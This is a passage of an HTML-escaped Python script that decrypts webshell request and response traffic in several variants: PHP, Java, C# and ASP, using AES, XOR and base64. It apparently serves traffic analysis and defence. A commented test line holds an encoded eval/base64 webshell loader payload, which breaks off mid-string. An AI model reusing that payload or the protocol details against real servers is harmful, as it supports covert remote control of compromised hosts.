class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload.decode().split(self.pass_ + &amp;#x27;=&amp;#x27;)[1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        encrypted_text = base64.b64decode(unquote(payload))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = cipher.decrypt(encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = unpad(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            decrypted_text = gzip.decompress(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        except:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return decrypted_text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload.decode()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload[16:-16]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        encrypted_text = base64.b64decode(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = cipher.decrypt(encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = unpad(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return gzip.decompress(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class JAVA_AES_RAW:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;&amp;quot;&amp;quot;&amp;quot;16进制字符串: d26414f92d691674f3dedb554e70202550ff681c03dcd3572f74df4c4c68d7078abb82808610aee869f51107d7d66f60&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        encrypted_text = payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = cipher.decrypt(encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = unpad(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            decrypted_text = gzip.decompress(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        except:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return decrypted_text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        encrypted_text = payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = cipher.decrypt(encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = unpad(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return gzip.decompress(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class CSHAP_AES_BASE64:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload.decode().split(self.pass_ + &amp;#x27;=&amp;#x27;)[1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        encrypted_text = base64.b64decode(unquote(payload))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = cipher.decrypt(encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = unpad(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            decrypted_text = gzip.decompress(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        except:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return decrypted_text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload.decode()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload[16:-16]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        encrypted_text = base64.b64decode(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = cipher.decrypt(encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = unpad(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return gzip.decompress(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class CSHAP_EVAL_AES_BASE64:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        body = unquote(payload.decode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        match = re.findall(r&amp;quot;HttpUtility.UrlDecode\(&amp;#x27;(.*)&amp;#x27;\)\)\)&amp;quot;, str(body))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp = match[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = base64.b64decode(tmp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return decrypted_text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload.decode()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload[16:-16]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        encrypted_text = base64.b64decode(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = cipher.decrypt(encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = unpad(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return gzip.decompress(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class CSHAP_ASMX_AES_BASE64:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        body = payload.decode()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        match = re.findall(r&amp;quot;&amp;lt;&amp;#123;&amp;#125;&amp;gt;(.*?)&amp;lt;/&amp;#123;&amp;#125;&amp;gt;&amp;quot;.format(self.pass_, self.pass_), str(body))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        encrypted_text = base64.b64decode(unquote(match[0]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = cipher.decrypt(encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = unpad(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            decrypted_text = gzip.decompress(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        except:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return decrypted_text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        body = payload.decode()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        match = re.findall(r&amp;quot;&amp;lt;&amp;#123;&amp;#125;Result&amp;gt;(.*?)&amp;lt;/&amp;#123;&amp;#125;Result&amp;gt;&amp;quot;.format(self.pass_, self.pass_), str(body))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = match[0][16:-16]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        encrypted_text = base64.b64decode(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = cipher.decrypt(encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = unpad(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return gzip.decompress(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class CSHAP_AES_RAW:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        encrypted_text = payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = cipher.decrypt(encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = unpad(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            decrypted_text = gzip.decompress(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        except:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return decrypted_text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        encrypted_text = payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = cipher.decrypt(encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        decrypted_text = unpad(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return gzip.decompress(decrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class ASP_BASE64:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload.decode().split(self.pass_ + &amp;#x27;=&amp;#x27;)[1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return base64.b64decode(unquote(payload))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload.decode()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload[6:-6]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return base64.b64decode((payload))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class ASP_EVAL_BASE64:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        body = unquote(payload.decode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        match = re.findall(r&amp;#x27;bd\(&amp;quot;&amp;quot;&amp;quot;&amp;quot;(.*?)&amp;quot;&amp;quot;&amp;quot;&amp;quot;\)&amp;#x27;, str(body))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp = bytes(bytearray.fromhex(match[0]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return tmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload[6:-6]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return base64.b64decode((payload))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class ASP_RAW:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class ASP_XOR_BASE64:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload.decode().split(self.pass_ + &amp;#x27;=&amp;#x27;)[1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return XOR(base64.b64decode(unquote(payload)), self.key)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload.decode()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload = payload[6:-6]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return XOR(base64.b64decode(payload), self.key)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class ASP_XOR_RAW:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self, pass_, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pass_ = pass_&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.key = key&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_req_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return XOR(payload, self.key)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def decrypt_res_payload(self, payload):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return XOR(payload, self.key)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    decrypter = PHP_XOR_BASE64(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_req_payload(b&amp;#x27;pass=DlMRWA1cL1gOVDc2MjRhRwZFEQ==&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = decrypter.decrypt_res_payload(b&amp;#x27;72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # php_xor_raw_req = &amp;#x27;0e5311580d5c2f580e54373632346147064511&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # php_xor_raw_res = &amp;#x27;7cbd6d3062386139633bfefd343426eebf4f67306238&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # decrypter = PHP_XOR_RAW(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(php_xor_raw_req)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(php_xor_raw_res)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # print(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # decrypter = PHP_EVAL_XOR_BASE64(pass_=&amp;#x27;pass&amp;#x27;, key=&amp;#x27;3c6e0b8a9c15224a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # data = decrypter.decrypt_req_payload(b&amp;#x27;pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZpp